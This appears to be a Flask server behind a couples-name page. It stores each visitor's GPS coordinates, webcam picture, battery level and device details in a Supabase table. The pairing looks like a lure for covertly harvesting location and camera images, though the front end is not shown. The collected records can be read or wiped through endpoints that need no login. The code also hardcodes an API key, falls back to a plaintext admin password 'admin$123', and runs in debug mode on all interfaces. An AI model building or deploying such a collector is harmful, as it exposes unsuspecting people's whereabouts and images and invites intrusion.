import os
from datetime import datetime
import requests
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__, static_folder='.', static_url_path='')

SUPABASE_URL = "https://rixjkiebspsjvdnmmpvp.supabase.co"
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "sb_publishable_wpKFc1qzlSGrJ03HqeKTdw_wq435ith")

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "return=representation"
}

def get_admin_password():
    try:
        res = requests.get(f"{SUPABASE_URL}/rest/v1/admin_auth?id=eq.1&select=password", headers=HEADERS)
        if res.status_code == 200 and res.json():
            return res.json()[0].get('password', 'admin$123')
    except Exception as e:
        print("Exception fetching admin password:", e)
    return 'admin$123'

def set_admin_password(new_pass):
    try:
        requests.patch(f"{SUPABASE_URL}/rest/v1/admin_auth?id=eq.1", headers=HEADERS, json={"password": new_pass})
    except Exception as e:
        print("Error updating password:", e)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    data = request.get_json() or {}
    if data.get('password', '') == get_admin_password():
        return jsonify({'success': True, 'message': 'Authenticated'})
    return jsonify({'success': False, 'error': 'Incorrect password'}), 401

@app.route('/api/admin/change-password', methods=['POST'])
def change_password():
    data = request.get_json() or {}
    old_p = data.get('old_password', '')
    new_p = data.get('new_password', '').strip()
    if old_p != get_admin_password():
        return jsonify({'success': False, 'error': 'Incorrect old password'}), 401
    set_admin_password(new_p)
    return jsonify({'success': True, 'message': 'Password updated'})

@app.route('/api/records', methods=['GET'])
@app.route('/api/entries', methods=['GET'])
def get_records():
    try:
        res = requests.get(f"{SUPABASE_URL}/rest/v1/demo_telemetry?select=*&order=id.desc", headers=HEADERS)
        if res.status_code == 200:
            records = res.json()
            return jsonify({'success': True, 'count': len(records), 'records': records})
        else:
            print(f"Supabase GET Error ({res.status_code}): {res.text}")
            return jsonify({'success': True, 'count': 0, 'records': []})
    except Exception as e:
        print("Exception get_records:", e)
        return jsonify({'success': True, 'count': 0, 'records': []})

@app.route('/api/telemetry', methods=['POST'])
@app.route('/api/report', methods=['POST'])
@app.route('/api/entries', methods=['POST'])
def save_telemetry():
    data = request.get_json() or {}
    your_name = data.get('your_name', '').strip()
    partner_name = data.get('partner_name', '').strip()
    couple_names = data.get('couple_names', '').strip() or (f"{your_name} ❤ {partner_name}" if (your_name and partner_name) else "Demo Participant")
    
    payload = {
        "timestamp": datetime.utcnow().isoformat() + 'Z',
        "couple_names": couple_names,
        "device_name": data.get('device_name', 'Generic Device'),
        "device_type": data.get('device_type', 'desktop'),
        "browser": data.get('browser', 'Unknown Browser'),
        "os": data.get('os', 'Unknown OS'),
        "battery_level": data.get('battery_level'),
        "battery_charging": 1 if data.get('battery_charging') is True else (0 if data.get('battery_charging') is False else None),
        "screen_res": data.get('screen_res', 'Unknown'),
        "timezone": data.get('timezone', 'Unknown'),
        "user_agent": data.get('raw_user_agent', ''),
        "latitude": data.get('latitude'),
        "longitude": data.get('longitude'),
        "location_status": data.get('location_status', 'Not Requested'),
        "camera_status": data.get('camera_status', 'Not Requested'),
        "webcam_pic": data.get('webcam_pic')
    }

    try:
        res = requests.post(f"{SUPABASE_URL}/rest/v1/demo_telemetry", headers=HEADERS, json=payload)
        if res.status_code in [200, 201]:
            return jsonify({'success': True, 'message': 'Saved'}), 201
        else:
            print(f"Supabase POST Error ({res.status_code}): {res.text}")
            return jsonify({'success': False, 'error': res.text}), res.status_code
    except Exception as e:
        print("Exception save_telemetry:", e)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/clear', methods=['POST'])
def clear_records():
    try:
        requests.delete(f"{SUPABASE_URL}/rest/v1/demo_telemetry?id=gt.0", headers=HEADERS)
        return jsonify({'success': True, 'message': 'Cleared'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
